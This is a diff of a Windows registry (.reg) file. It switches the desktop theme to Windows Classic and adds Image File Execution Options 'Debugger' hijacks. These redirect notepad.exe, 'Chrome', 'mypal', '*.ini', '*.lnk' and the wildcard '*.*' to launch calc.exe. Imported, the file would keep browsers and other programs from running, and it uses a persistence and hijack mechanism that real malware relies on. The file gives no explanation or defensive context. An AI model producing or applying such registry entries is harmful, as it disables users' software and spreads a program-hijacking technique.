@@ -3,8 +3,9 @@ Windows Registry Editor Version 5.00
 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe]
 "Debugger"="C:\\Windows\\System32\\calc.exe"
 
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes]
-"CurrentTheme"="C:\\Windows\\Resources\\Ease of Access Themes\\hc1.theme"
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ThemeManager]
+"ThemeActive"="0"
+"ColorName"="Windows Classic"
 
 [HKEY_CURRENT_USER\Control Panel\Colors]
 "ActiveTitle"="0 0 0"
@@ -23,5 +24,17 @@ Windows Registry Editor Version 5.00
 "Debugger"="calc.exe"
 
 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*.ini]
-"Debugger"="chrome.exe"
+"Debugger"="calc.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mypal]
+"Debugger"="calc.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Chrome]
+"Debugger"="calc.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*.lnk]
+"Debugger"="calc.exe"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*.*]
+"Debugger"="calc.exe"
 
